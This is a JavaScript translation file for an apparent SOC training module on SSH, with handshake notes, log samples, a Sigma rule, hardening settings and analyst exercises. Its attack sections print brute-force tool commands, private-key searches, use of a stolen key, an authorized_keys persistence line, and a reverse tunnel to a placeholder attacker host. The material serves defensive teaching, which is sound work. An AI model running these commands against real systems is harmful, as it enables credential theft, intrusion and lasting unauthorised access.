/* ============================================================
   i18n-ssh.js — Traducciones EN del modulo SSH
   Protocolos Red SOC · @xavimape
   ============================================================
   Requiere que i18n-core.js este cargado antes (usa i18n.register).
   ============================================================ */

'use strict';

i18n.register({
    'ssh.subtitle': "Secure Shell · TCP/22 · Application Layer",
    'ssh.demo.waiting':      { es: 'Selecciona una demo y pulsa el botón...', en: 'Select a demo and press the button...' },
    'ssh.demo.btn.auth':     { es: '▶ Autenticación SSH', en: '▶ SSH Authentication' },
    'ssh.demo.btn.brute':    { es: '▶ Brute Force SSH', en: '▶ SSH Brute Force' },
    'ssh.demo.btn.tunnel':   { es: '▶ SSH Tunneling', en: '▶ SSH Tunneling' },
    'ssh.demo.auth.title':   { es: '🔑 Demo: Autenticación SSH (clave pública)', en: '🔑 Demo: SSH Authentication (public key)' },
    'ssh.demo.auth.server':  { es: 'Servidor SSH objetivo:', en: 'Target SSH server:' },
    'ssh.demo.auth.user': "Username:",
    'ssh.demo.auth.method':  { es: 'Método:', en: 'Method:' },
    'ssh.demo.auth.output':  { es: 'Salida de autenticación:', en: 'Authentication output:' },
    'ssh.demo.brute.title':  { es: '💥 Demo: SSH Brute Force', en: '💥 Demo: SSH Brute Force' },
    'ssh.demo.brute.target': "Target:",
    'ssh.demo.brute.type':   { es: 'Tipo de ataque:', en: 'Attack type:' },
    'ssh.demo.brute.panel':  { es: 'Intentos de brute force:', en: 'Brute force attempts:' },
    'ssh.demo.brute.output': { es: 'Resultado:', en: 'Result:' },
    'ssh.demo.tunnel.title': { es: '🚇 Demo: SSH Tunneling / C2', en: '🚇 Demo: SSH Tunneling / C2' },
    'ssh.demo.tunnel.type': "Tunnel type:",
    'ssh.demo.tunnel.desc':  { es: 'SSH permite crear túneles cifrados que encapsulan otro tráfico. Esto es legítimo para acceso seguro, pero los atacantes lo abusan para exfiltrar datos o saltarse firewalls/proxies corporativos.', en: 'SSH can create encrypted tunnels that encapsulate other traffic. This is legitimate for secure access, but attackers abuse it to exfiltrate data or bypass corporate firewalls/proxies.' },
    'ssh.demo.tunnel.jump':  { es: 'Jump host:', en: 'Jump host:' },
    'ssh.demo.tunnel.panel': { es: 'Estableciendo túnel:', en: 'Establishing tunnel:' },
    'ssh.demo.tunnel.output':{ es: 'Estado del túnel:', en: 'Tunnel status:' },
    'ssh.s1.title': "What is SSH?",
    'ssh.s1.sub': "The secure replacement for Telnet, rsh, and rlogin",
    'ssh.s1.p1':          { es: 'SSH (Secure Shell) es un protocolo criptográfico para operar servicios de red de forma segura sobre redes no confiables. Reemplazó a Telnet (texto claro) en 1995.', en: 'SSH (Secure Shell) is a cryptographic protocol for operating network services securely over untrusted networks. It replaced Telnet (cleartext) in 1995.' },
    'ssh.s1.uses.title': "Legitimate SSH uses:",
    'ssh.s1.u1': "🖥️ Remote administration of Linux/Unix servers",
    'ssh.s1.u2': "📁 Secure file transfer (SFTP, SCP)",
    'ssh.s1.u3': "🚇 Port tunneling and SOCKS proxy",
    'ssh.s1.u4': "🔑 Public/private key authentication without passwords",
    'ssh.s1.u5': "🔒 Git over SSH (GitHub, GitLab, Bitbucket)",
    'ssh.s1.abuses.title': "SSH abuses by attackers:",
    'ssh.s1.a1': "💥 Password brute force (service exposed to Internet)",
    'ssh.s1.a2': "🔑 SSH private key theft for persistent access",
    'ssh.s1.a3': "📡 Tunneling to exfiltrate data or bypass network controls",
    'ssh.s1.a4': "🌐 C2 (Command &amp; Control) over encrypted SSH",
    'ssh.s2.title': "SSH Handshake and Encryption",
    'ssh.s2.sub': "Algorithm negotiation and encrypted channel establishment",
    'ssh.s3.title': "Public Key Authentication",
    'ssh.s3.sub': "The gold standard — more secure than passwords",
    'ssh.s4.title': "Attack 1: SSH Brute Force",
    'ssh.s4.sub': "The most common attack against Internet-exposed SSH",
    'ssh.s4.p1':    { es: 'Cualquier servidor SSH expuesto a Internet recibe intentos de brute force en minutos. Los atacantes usan credenciales comunes y listas de contraseñas filtradas de breaches.', en: 'Any Internet-exposed SSH server receives brute force attempts within minutes. Attackers use common credentials and leaked password lists from breaches.' },
    'ssh.s5.title': "Attack 2: SSH Key Theft",
    'ssh.s5.sub': "Stealing private keys — permanent access without passwords",
    'ssh.s5.p1':    { es: 'Una vez comprometido un sistema, las claves SSH privadas son el primer objetivo. Con ellas el atacante puede moverse lateralmente sin contraseñas y de forma silenciosa.', en: 'Once a system is compromised, SSH private keys are the first target. With them, the attacker can move laterally silently without passwords.' },
    'ssh.s6.title': "Attack 3: SSH Tunneling as C2",
    'ssh.s6.sub': "Exfiltration and hidden C2 inside encrypted SSH",
    'ssh.s7.title': "SSH in SOC Telemetry",
    'ssh.s7.sub': "Zeek ssh.log + auth.log — the two key logs for SSH",
    'ssh.s8.title': "SSH Hardening — secure configuration",
    'ssh.s8.sub': "Minimum security configuration for sshd_config",
    'ssh.s8.h1': "Public key only",
    'ssh.s8.h2': "No root login",
    'ssh.s8.h3': "User whitelist",
    'ssh.s8.h4': "Authentication timeout",
    'ssh.s8.h5': "Maximum logging",
    'ssh.s8.h6': "Strong algorithms only",
    'ssh.s8.h7': "Fail2ban",
    'ssh.s8.h8': "Firewall + VPN",
    'ssh.ej1.title': { es: 'Ejercicio 1: Identificar Brute Force SSH', en: 'Exercise 1: Identify SSH Brute Force' },
    'ssh.ej1.q':     { es: 'Analiza el siguiente fragmento de auth.log y determina: ¿Es esto un brute force? ¿Fue exitoso? ¿Qué acción debe tomar el analista?', en: 'Analyze the following auth.log excerpt and determine: Is this a brute force? Was it successful? What action should the analyst take?' },
    'ssh.ej2.title': { es: 'Ejercicio 2: Detectar Clave SSH Comprometida', en: 'Exercise 2: Detect Compromised SSH Key' },
    'ssh.ej2.q':     { es: 'Un usuario reporta acceso no autorizado a su servidor. Revisar Zeek ssh.log y explicar qué tipo de ataque ocurrió y cómo lo detectarías.', en: 'A user reports unauthorized access to their server. Review Zeek ssh.log and explain what type of attack occurred and how you would detect it.' },
    'ssh.ej3.title': { es: 'Ejercicio 3: Análisis de SSH Tunneling', en: 'Exercise 3: SSH Tunneling Analysis' },
    'ssh.ej3.q':     { es: 'Identifica en los logs si hay evidencia de tunneling SSH abusivo y explica qué tipo de túnel se estaría usando y con qué fin.', en: 'Identify in the logs whether there is evidence of abusive SSH tunneling and explain what type of tunnel is being used and for what purpose.' },
    'ssh.ej4.title': { es: 'Ejercicio 4: Hardening de SSH', en: 'Exercise 4: SSH Hardening' },
    'ssh.ej4.q':     { es: 'Dado el siguiente sshd_config inseguro, identifica todos los problemas de configuración y propón la configuración correcta para un servidor de producción.', en: 'Given the following insecure sshd_config, identify all configuration issues and propose the correct configuration for a production server.' },
    'ssh.ej5.title': { es: 'Ejercicio 5: Regla de Detección SIEM', en: 'Exercise 5: SIEM Detection Rule' },
    'ssh.ej5.q':     { es: 'Escribe una regla de correlación para detectar: brute force SSH (umbral configurable), seguido de login exitoso, desde la misma IP en un intervalo de 5 minutos.', en: 'Write a correlation rule to detect: SSH brute force (configurable threshold), followed by successful login, from the same IP within a 5-minute window.' },
    'ssh.challenge.title': { es: 'Desafío Final: Investigación de Incidente SSH', en: 'Final Challenge: SSH Incident Investigation' },
    'ssh.challenge.ctx':   { es: 'El SIEM alerta: 450 intentos fallidos de SSH en 3 minutos desde 185.220.101.x (Tor exit node) a varios servidores, seguido de login exitoso en srv-db-01 con usuario "postgres" a las 03:47 UTC. Cinco minutos después se detecta tráfico inusual saliente por TCP/22 con 2GB de datos transferidos.', en: 'SIEM alerts: 450 failed SSH attempts in 3 minutes from 185.220.101.x (Tor exit node) to multiple servers, followed by successful login on srv-db-01 with user "postgres" at 03:47 UTC. Five minutes later, unusual outbound TCP/22 traffic with 2GB transferred is detected.' },
    'ssh.challenge.q':     { es: '¿Qué MITRE ATT&CK TTPs identificas? ¿Qué pasos inmediatos tomas como analista nivel 1? ¿Cómo determinas si hubo exfiltración de datos? ¿Qué controles habrían prevenido esto?', en: 'What MITRE ATT&CK TTPs do you identify? What immediate steps do you take as a Level 1 analyst? How do you determine if data exfiltration occurred? What controls would have prevented this?' },
    'ssh.cheat.r1a': "Multiple \"Failed password\" from the same IP in &lt;60s",
    'ssh.cheat.r1c': "Block IP, verify whether it succeeded",
    'ssh.cheat.r2a': "Accepted publickey with an unregistered fingerprint",
    'ssh.cheat.r2b': "Backdoor key installed",
    'ssh.cheat.r2c': "Critical — audit authorized_keys on all servers",
    'ssh.cheat.r3a': "Service-account login from an external IP",
    'ssh.cheat.r3b': "Stolen key / backdoor",
    'ssh.cheat.r3c': "High — revoke the key, investigate the source",
    'ssh.cheat.r4a': "SSH session &gt;1h with &gt;50MB of outbound data",
    'ssh.cheat.r4b': "Tunneling / exfiltration",
    'ssh.cheat.r4c': "Investigate, correlate with DLP",
    'ssh.cheat.r5a': "Successful login from an unusual country for the user",
    'ssh.cheat.r5b': "Compromised account / impossible travel",
    'ssh.cheat.r5c': "Block the session, contact the user, reset credentials",
    'ssh.cheat.r6a': "Modification of ~/.ssh/authorized_keys",
    'ssh.cheat.r6b': "SSH backdoor / persistence",
    'ssh.cheat.r6c': "Alert immediately, review the new key",
    'ssh.cheat.r7a': "Outbound SSH from a user workstation",
    'ssh.cheat.r7b': "Shadow IT / unauthorized tunneling",
    'ssh.cheat.r7c': "Investigate the destination, SSH egress policy",
    'ssh.rec.fail2ban': "Fail2ban for SSH",
    'ssh.pre0': { es: `
FASES DEL HANDSHAKE SSH:

1. TCP CONNECT (cliente → servidor, TCP/22)

2. BANNER EXCHANGE:
   Servidor → "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3"
   Cliente  → "SSH-2.0-OpenSSH_9.1"
   ⚠ El banner revela versión → buscar CVEs específicos

3. KEY EXCHANGE (SSH_MSG_KEXINIT):
   Negociación de algoritmos:
   - Key exchange: ecdh-sha2-nistp256, diffie-hellman-group14-sha256
   - Cifrado:      aes256-gcm@openssh.com, chacha20-poly1305
   - MAC:          hmac-sha2-256, umac-128
   - Compresión:   none, zlib@openssh.com

4. SERVER HOST KEY VERIFICATION:
   Servidor presenta su clave pública (Ed25519/ECDSA/RSA)
   Cliente verifica contra ~/.ssh/known_hosts
   ⚠ Primera conexión: "The authenticity of host can't be established"
   Si alguien acepta sin verificar → TOFU sin validación real

5. DIFFIE-HELLMAN KEY AGREEMENT:
   Genera session key sin transmitirla (forward secrecy)

6. AUTENTICACIÓN del usuario:
   a) Password: contraseña enviada CIFRADA (a diferencia de FTP)
   b) Public key: cliente firma con su clave privada → servidor verifica con pública
   c) GSSAPI/Kerberos: integración con AD

Todo el canal desde aquí: CIFRADO con la session key`, en: `
SSH HANDSHAKE PHASES:

1. TCP CONNECT (client → server, TCP/22)

2. BANNER EXCHANGE:
   Server → "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3"
   Client → "SSH-2.0-OpenSSH_9.1"
   ⚠ The banner reveals the version → look for specific CVEs

3. KEY EXCHANGE (SSH_MSG_KEXINIT):
   Algorithm negotiation:
   - Key exchange: ecdh-sha2-nistp256, diffie-hellman-group14-sha256
   - Encryption:   aes256-gcm@openssh.com, chacha20-poly1305
   - MAC:          hmac-sha2-256, umac-128
   - Compression:  none, zlib@openssh.com

4. SERVER HOST KEY VERIFICATION:
   Server presents its public key (Ed25519/ECDSA/RSA)
   Client checks against ~/.ssh/known_hosts
   ⚠ First connection: "The authenticity of host can't be established"
   If someone accepts without verifying → TOFU with no real validation

5. DIFFIE-HELLMAN KEY AGREEMENT:
   Generates a session key without transmitting it (forward secrecy)

6. User AUTHENTICATION:
   a) Password: password sent ENCRYPTED (unlike FTP)
   b) Public key: client signs with its private key → server verifies with public
   c) GSSAPI/Kerberos: AD integration

The whole channel from here: ENCRYPTED with the session key` },
    'ssh.pre1': { es: `
GENERACIÓN DE PAR DE CLAVES:
  ssh-keygen -t ed25519 -C "admin@empresa.com"
  → Genera: ~/.ssh/id_ed25519       (clave privada — NUNCA compartir)
            ~/.ssh/id_ed25519.pub   (clave pública — se distribuye)

INSTALACIÓN DE CLAVE PÚBLICA EN SERVIDOR:
  ssh-copy-id -i ~/.ssh/id_ed25519.pub admin@servidor
  → Agrega la clave al servidor: /home/admin/.ssh/authorized_keys

TIPOS DE CLAVES (de mejor a peor):
  Ed25519 ✅ — más seguro, más rápido, clave pequeña (256 bits)
  ECDSA   ✅ — bueno, ampliamente compatible
  RSA     ⚠  — funciona pero necesita ≥4096 bits para ser seguro hoy
  DSA     ✖  — ROTO, no usar (max 1024 bits)

FLUJO DE AUTENTICACIÓN POR CLAVE PÚBLICA:
  1. Cliente: "quiero autenticar con mi clave pública Ed25519 xyz..."
  2. Servidor: verifica que xyz está en authorized_keys
  3. Servidor: genera challenge random, lo cifra con la clave pública xyz
  4. Cliente: descifra el challenge con su clave PRIVADA → responde
  5. Servidor: verifica la respuesta → autenticación exitosa

VENTAJA DE SEGURIDAD:
  → La clave privada NUNCA viaja por la red
  → Sin contraseña no hay nada que interceptar ni bruteforcear
  → Con passphrase en la clave privada: 2FA implícito
  → Con ssh-agent: un solo unlock de la clave por sesión`, en: `
KEY PAIR GENERATION:
  ssh-keygen -t ed25519 -C "admin@empresa.com"
  → Generates: ~/.ssh/id_ed25519       (private key — NEVER share)
               ~/.ssh/id_ed25519.pub   (public key — distributed)

INSTALLING THE PUBLIC KEY ON THE SERVER:
  ssh-copy-id -i ~/.ssh/id_ed25519.pub admin@server
  → Adds the key to the server: /home/admin/.ssh/authorized_keys

KEY TYPES (best to worst):
  Ed25519 ✅ — most secure, fastest, small key (256 bits)
  ECDSA   ✅ — good, widely compatible
  RSA     ⚠  — works but needs ≥4096 bits to be secure today
  DSA     ✖  — BROKEN, do not use (max 1024 bits)

PUBLIC-KEY AUTHENTICATION FLOW:
  1. Client: "I want to authenticate with my Ed25519 public key xyz..."
  2. Server: verifies that xyz is in authorized_keys
  3. Server: generates a random challenge, encrypts it with public key xyz
  4. Client: decrypts the challenge with its PRIVATE key → responds
  5. Server: verifies the response → authentication successful

SECURITY ADVANTAGE:
  → The private key NEVER travels over the network
  → With no password there is nothing to intercept or brute-force
  → With a passphrase on the private key: implicit 2FA
  → With ssh-agent: a single key unlock per session` },
    'ssh.pre2': { es: `
ESCALA REAL: Un servidor SSH expuesto a Internet recibe
  ~100-1000 intentos de login por hora de bots automatizados.
  → En 24h: hasta 24.000 intentos desde decenas de IPs distintas

HERRAMIENTAS COMUNES:
  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
  medusa -h target -u admin -P passwords.txt -M ssh -t 4
  ncrack -p 22 --user root -P top10k.txt target

DETECCIÓN en /var/log/auth.log:
  Jun 25 03:14:01 server sshd[1234]: Failed password for root from 1.2.3.4 port 51234 ssh2
  Jun 25 03:14:02 server sshd[1234]: Failed password for root from 1.2.3.4 port 51235 ssh2
  [... ×200 en 60 segundos ...]
  Jun 25 03:15:44 server sshd[1234]: Accepted password for admin from 1.2.3.4 port 51512 ssh2

DETECCIÓN en Zeek ssh.log:
  ts    id.orig_h     id.resp_h    auth_success  client      server
  ...   1.2.3.4       10.0.0.10    false         OpenSSH_8.4 OpenSSH_8.9p1
  [200 entradas con auth_success=false, luego una con true]

MITIGACIONES:
  1. Deshabilitar login por contraseña: PasswordAuthentication no
  2. Fail2ban o similar: ban automático tras N fallos
  3. Cambiar puerto (oscuridad, reduce ruido)
  4. AllowUsers — lista blanca de usuarios permitidos
  5. Solo auth por clave pública`, en: `
REAL SCALE: An SSH server exposed to the Internet receives
  ~100-1000 login attempts per hour from automated bots.
  → In 24h: up to 24,000 attempts from dozens of different IPs

COMMON TOOLS:
  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
  medusa -h target -u admin -P passwords.txt -M ssh -t 4
  ncrack -p 22 --user root -P top10k.txt target

DETECTION in /var/log/auth.log:
  Jun 25 03:14:01 server sshd[1234]: Failed password for root from 1.2.3.4 port 51234 ssh2
  Jun 25 03:14:02 server sshd[1234]: Failed password for root from 1.2.3.4 port 51235 ssh2
  [... ×200 in 60 seconds ...]
  Jun 25 03:15:44 server sshd[1234]: Accepted password for admin from 1.2.3.4 port 51512 ssh2

DETECTION in Zeek ssh.log:
  ts    id.orig_h     id.resp_h    auth_success  client      server
  ...   1.2.3.4       10.0.0.10    false         OpenSSH_8.4 OpenSSH_8.9p1
  [200 entries with auth_success=false, then one with true]

MITIGATIONS:
  1. Disable password login: PasswordAuthentication no
  2. Fail2ban or similar: automatic ban after N failures
  3. Change port (obscurity, reduces noise)
  4. AllowUsers — whitelist of allowed users
  5. Public-key auth only` },
    'ssh.pre3': { es: `
UBICACIONES DE CLAVES PRIVADAS SSH:
  ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.ssh/id_ecdsa
  /root/.ssh/id_*   ← acceso root expone todas las claves
  /home/*/.ssh/id_* ← afecta a todos los usuarios

BÚSQUEDA DE CLAVES DURANTE POST-EXPLOITATION:
  find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
  grep -r "BEGIN.*PRIVATE KEY" /home /root /etc 2>/dev/null

MOVIMIENTO LATERAL CON CLAVE ROBADA:
  ssh -i stolen_id_rsa admin@servidor-prod-02
  → Acceso inmediato sin contraseña
  ssh -i stolen_id_rsa ubuntu@bastion.empresa.com
  → Pivoting: desde bastion atacar hosts internos

PERSISTENCIA: Agregar clave propia del atacante a authorized_keys
  echo "ssh-ed25519 AAAA...atacante... " >> ~/.ssh/authorized_keys
  → El admin no nota nada (hay múltiples claves)
  → El atacante sigue teniendo acceso aunque cambie su contraseña

DETECCIÓN:
  git diff / inotifywait en ~/.ssh/authorized_keys
  SIEM: alerta si se modifica authorized_keys fuera de ventana de cambios
  Zeek ssh.log: mismo usuario conectándose desde múltiples IPs/países
  → Imposible viajar Berlín→Buenos Aires en 5 min → cuenta comprometida`, en: `
SSH PRIVATE KEY LOCATIONS:
  ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.ssh/id_ecdsa
  /root/.ssh/id_*   ← root access exposes all keys
  /home/*/.ssh/id_* ← affects all users

KEY SEARCH DURING POST-EXPLOITATION:
  find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
  grep -r "BEGIN.*PRIVATE KEY" /home /root /etc 2>/dev/null

LATERAL MOVEMENT WITH A STOLEN KEY:
  ssh -i stolen_id_rsa admin@prod-server-02
  → Immediate access without a password
  ssh -i stolen_id_rsa ubuntu@bastion.empresa.com
  → Pivoting: from the bastion attack internal hosts

PERSISTENCE: Add the attacker's own key to authorized_keys
  echo "ssh-ed25519 AAAA...attacker... " >> ~/.ssh/authorized_keys
  → The admin notices nothing (there are multiple keys)
  → The attacker keeps access even if they change their password

DETECTION:
  git diff / inotifywait on ~/.ssh/authorized_keys
  SIEM: alert if authorized_keys is modified outside the change window
  Zeek ssh.log: same user connecting from multiple IPs/countries
  → Impossible to travel Berlin→Buenos Aires in 5 min → compromised account` },
    'ssh.pre4': { es: `
TIPOS DE SSH TUNNELING:

LOCAL FORWARDING (-L):
  ssh -L 8080:db-interno:5432 user@bastion.empresa.com
  Atacante accede a localhost:8080 → tráfico va cifrado a través del bastion
  → Accede a db-interno:5432 como si estuviera dentro de la red

REMOTE FORWARDING (-R):
  ssh -R 9001:localhost:22 user@atacante.com
  → El servidor del atacante expone el puerto 9001
  → Conectar a atacante.com:9001 → llega al SSH de la víctima
  → Backdoor: la víctima inicia la conexión (sale del firewall)

DYNAMIC FORWARDING (-D) — SOCKS PROXY:
  ssh -D 1080 user@bastion.empresa.com
  → Configura proxy SOCKS5 en localhost:1080
  → Todo el tráfico del navegador va cifrado por el túnel SSH
  → Atacante navega por la red interna como si estuviera adentro

C2 SOBRE SSH:
  → Muchos malwares usan SSH reverso para Command & Control
  → El tráfico parece SSH legítimo (TCP/22, cifrado)
  → Difícil de distinguir de administración legítima

DETECCIÓN DE TUNNELING ABUSIVO:
  Zeek ssh.log: sesiones SSH muy largas con alto throughput
    duration > 3600s + orig_bytes > 100MB → sospechoso
  Conexiones SSH salientes desde workstations (no deberían hacer SSH saliente)
  NetFlow: ssh a IPs externas desconocidas desde hosts de usuarios`, en: `
SSH TUNNELING TYPES:

LOCAL FORWARDING (-L):
  ssh -L 8080:db-internal:5432 user@bastion.empresa.com
  Attacker accesses localhost:8080 → traffic goes encrypted through the bastion
  → Reaches db-internal:5432 as if inside the network

REMOTE FORWARDING (-R):
  ssh -R 9001:localhost:22 user@attacker.com
  → The attacker's server exposes port 9001
  → Connecting to attacker.com:9001 → reaches the victim's SSH
  → Backdoor: the victim initiates the connection (exits the firewall)

DYNAMIC FORWARDING (-D) — SOCKS PROXY:
  ssh -D 1080 user@bastion.empresa.com
  → Sets up a SOCKS5 proxy on localhost:1080
  → All browser traffic goes encrypted through the SSH tunnel
  → Attacker browses the internal network as if inside

C2 OVER SSH:
  → Many malware families use reverse SSH for Command & Control
  → The traffic looks like legitimate SSH (TCP/22, encrypted)
  → Hard to distinguish from legitimate administration

DETECTING ABUSIVE TUNNELING:
  Zeek ssh.log: very long SSH sessions with high throughput
    duration > 3600s + orig_bytes > 100MB → suspicious
  Outbound SSH connections from workstations (they should not make outbound SSH)
  NetFlow: ssh to unknown external IPs from user hosts` },
    'ssh.pre5': { es: `
# Zeek ssh.log — campos principales
ts     uid  id.orig_h    id.resp_h    auth_success  direction  client           server
10:01  X1   1.2.3.4      10.0.0.10    false         INBOUND    OpenSSH_8.4      OpenSSH_8.9p1
...    ×200 auth_success=false ...
10:05  X1   1.2.3.4      10.0.0.10    true           INBOUND    OpenSSH_8.4      OpenSSH_8.9p1

# /var/log/auth.log (Linux) / /var/log/secure (RHEL)
Jun 25 10:05:01 host sshd: Failed password for root from 1.2.3.4 port 45123 ssh2
Jun 25 10:05:22 host sshd: Accepted publickey for admin from 10.0.0.50 port 52000 ssh2 \\
  RSA SHA256:abc...

# IOC 1: Brute force
  Muchos "Failed password" desde misma IP en corto tiempo
  Sigma: count(Failed password) by src_ip > 20 in 60s

# IOC 2: Impossible travel / credencial comprometida
  Mismo usuario, auth exitosa desde país A y país B con pocas horas de diferencia

# IOC 3: Nuevo país / nueva IP para usuario conocido
  admin siempre se conecta desde 10.0.0.x (VPN) → alerta si lo hace desde 185.x.x.x

# IOC 4: Tunneling activo
  Zeek: duration > 1h + orig_bytes > 50MB para una conexión SSH

# Sigma regla — SSH brute force
title: SSH Brute Force
logsource:
  product: linux
  service: auth
detection:
  selection: "Failed password"
  condition: selection | count() by src_ip > 20
  timeframe: 60s
level: medium`, en: `
# Zeek ssh.log — main fields
ts     uid  id.orig_h    id.resp_h    auth_success  direction  client           server
10:01  X1   1.2.3.4      10.0.0.10    false         INBOUND    OpenSSH_8.4      OpenSSH_8.9p1
...    ×200 auth_success=false ...
10:05  X1   1.2.3.4      10.0.0.10    true           INBOUND    OpenSSH_8.4      OpenSSH_8.9p1

# /var/log/auth.log (Linux) / /var/log/secure (RHEL)
Jun 25 10:05:01 host sshd: Failed password for root from 1.2.3.4 port 45123 ssh2
Jun 25 10:05:22 host sshd: Accepted publickey for admin from 10.0.0.50 port 52000 ssh2 \\
  RSA SHA256:abc...

# IOC 1: Brute force
  Many "Failed password" from the same IP in a short time
  Sigma: count(Failed password) by src_ip > 20 in 60s

# IOC 2: Impossible travel / compromised credential
  Same user, successful auth from country A and country B within a few hours

# IOC 3: New country / new IP for a known user
  admin always connects from 10.0.0.x (VPN) → alert if from 185.x.x.x

# IOC 4: Active tunneling
  Zeek: duration > 1h + orig_bytes > 50MB for one SSH connection

# Sigma rule — SSH brute force
title: SSH Brute Force
logsource:
  product: linux
  service: auth
detection:
  selection: "Failed password"
  condition: selection | count() by src_ip > 20
  timeframe: 60s
level: medium` },
    'ssh.pre6': { es: `
# sshd_config — configuración mínima segura
Protocol 2
Port 22
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
LoginGraceTime 20
MaxAuthTries 3
AllowUsers admin deploy
LogLevel VERBOSE
X11Forwarding no
AllowTcpForwarding no    # deshabilitar tunneling si no es necesario
GatewayPorts no
KexAlgorithms curve25519-sha256,ecdh-sha2-nistp256
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com`, en: `
# sshd_config — minimal secure configuration
Protocol 2
Port 22
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
LoginGraceTime 20
MaxAuthTries 3
AllowUsers admin deploy
LogLevel VERBOSE
X11Forwarding no
AllowTcpForwarding no    # disable tunneling if not needed
GatewayPorts no
KexAlgorithms curve25519-sha256,ecdh-sha2-nistp256
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com` },
    'ssh.pre7': { es: `
Jun 25 04:10:01 webserver sshd[2201]: Failed password for root from 185.220.101.5 port 44001 ssh2
Jun 25 04:10:02 webserver sshd[2201]: Failed password for root from 185.220.101.5 port 44002 ssh2
[... 89 líneas similares con root, admin, ubuntu, operator ...]
Jun 25 04:11:44 webserver sshd[2201]: Failed password for deploy from 185.220.101.5 port 44093 ssh2
Jun 25 04:11:47 webserver sshd[2201]: Accepted password for deploy from 185.220.101.5 port 44094 ssh2
Jun 25 04:11:49 webserver sshd[2201]: pam_unix(sshd:session): session opened for user deploy
Jun 25 04:15:22 webserver sshd[2201]: pam_unix(sshd:session): session closed for user deploy`, en: `
Jun 25 04:10:01 webserver sshd[2201]: Failed password for root from 185.220.101.5 port 44001 ssh2
Jun 25 04:10:02 webserver sshd[2201]: Failed password for root from 185.220.101.5 port 44002 ssh2
[... 89 similar lines with root, admin, ubuntu, operator ...]
Jun 25 04:11:44 webserver sshd[2201]: Failed password for deploy from 185.220.101.5 port 44093 ssh2
Jun 25 04:11:47 webserver sshd[2201]: Accepted password for deploy from 185.220.101.5 port 44094 ssh2
Jun 25 04:11:49 webserver sshd[2201]: pam_unix(sshd:session): session opened for user deploy
Jun 25 04:15:22 webserver sshd[2201]: pam_unix(sshd:session): session closed for user deploy` },
    'ssh.pre8': { es: `
Zeek ssh.log:
  ts       uid  id.orig_h       id.resp_h       direction  auth_success  duration  orig_bytes   resp_bytes
  09:00:01 A1   10.0.0.55       github.com:22   OUTBOUND   true          7200s     245 MB       2 MB
  09:00:05 A2   10.0.0.55       34.122.87.5:22  OUTBOUND   true          7199s     312 MB       1.5 MB
  09:00:10 A3   10.0.0.55       45.33.32.156:22 OUTBOUND   true          7198s     198 MB       800 KB

Contexto:
  10.0.0.55 = workstation de mgarcia (developer)
  github.com = legítimo (uso esperado)
  34.122.87.5 = DigitalOcean (VPS, no en lista de servidores de la empresa)
  45.33.32.156 = Linode/Akamai (VPS, no en lista)
  Hora: 09:00 - 11:00 (horario laboral normal)
  orig_bytes >> resp_bytes → la workstation ENVÍA más de lo que recibe`, en: `
Zeek ssh.log:
  ts       uid  id.orig_h       id.resp_h       direction  auth_success  duration  orig_bytes   resp_bytes
  09:00:01 A1   10.0.0.55       github.com:22   OUTBOUND   true          7200s     245 MB       2 MB
  09:00:05 A2   10.0.0.55       34.122.87.5:22  OUTBOUND   true          7199s     312 MB       1.5 MB
  09:00:10 A3   10.0.0.55       45.33.32.156:22 OUTBOUND   true          7198s     198 MB       800 KB

Context:
  10.0.0.55 = mgarcia's workstation (developer)
  github.com = legitimate (expected use)
  34.122.87.5 = DigitalOcean (VPS, not in the company's server list)
  45.33.32.156 = Linode/Akamai (VPS, not in the list)
  Time: 09:00 - 11:00 (normal working hours)
  orig_bytes >> resp_bytes → the workstation SENDS more than it receives` },
    'ssh.pre10': { es: `
auth.log:
  Fri Jun 20 18:00:11 prod-api-01 sshd: Accepted publickey for buildbot
    from 85.214.143.22 port 59900 ssh2 RSA SHA256:newFP/xyz+abc...
  Fri Jun 20 18:00:15 prod-api-01 sshd: session closed for user buildbot

Contexto:
  - buildbot solo se conecta desde Jenkins CI (10.0.5.10) con la clave RSA SHA256:legitFP/ABC...
  - El fingerprint del login es SHA256:newFP/xyz+abc... (DISTINTO al legítimo)
  - 4 segundos — demasiado poco para un deploy real
  - El CI/CD de Jenkins no tiene ningún job activo a las 18:00`, en: `
auth.log:
  Fri Jun 20 18:00:11 prod-api-01 sshd: Accepted publickey for buildbot
    from 85.214.143.22 port 59900 ssh2 RSA SHA256:newFP/xyz+abc...
  Fri Jun 20 18:00:15 prod-api-01 sshd: session closed for user buildbot

Context:
  - buildbot only connects from Jenkins CI (10.0.5.10) with the RSA key SHA256:legitFP/ABC...
  - The login fingerprint is SHA256:newFP/xyz+abc... (DIFFERENT from the legitimate one)
  - 4 seconds — far too little for a real deploy
  - Jenkins CI/CD has no active job at 18:00` },
    'ssh.opt1': "Public key (recommended)",
    'ssh.opt2': "Local forwarding (-L) — access to internal resources",
    'ssh.opt3': "Remote forwarding (-R) — external access to the inside",
    'ssh.opt4': "Private key search",
    'ssh.opt5': "Exfiltration and use of stolen key",
    'ssh.opt6': "Persistence (add key to authorized_keys)",
    'ssh.demo.keytheft.title': "🗝️ Demo: SSH Key Theft — Private Key Theft",
    'ssh.demo.keytheft.desc':   { es: 'Tras comprometer un sistema, el atacante busca claves SSH privadas para moverse lateralmente sin contraseñas.', en: 'After compromising a system, the attacker searches for SSH private keys to move laterally without passwords.' },
    'ssh.demo.keytheft.panel': "Simulate key theft",
    'ssh.demo.keytheft.victim': "Compromised system:",
    'ssh.demo.keytheft.stage': "Attack phase:",
    'ssh.demo.keytheft.result': "Result",
    'ssh.demo.btn.keytheft': "▶ Simulate Key Theft",
});
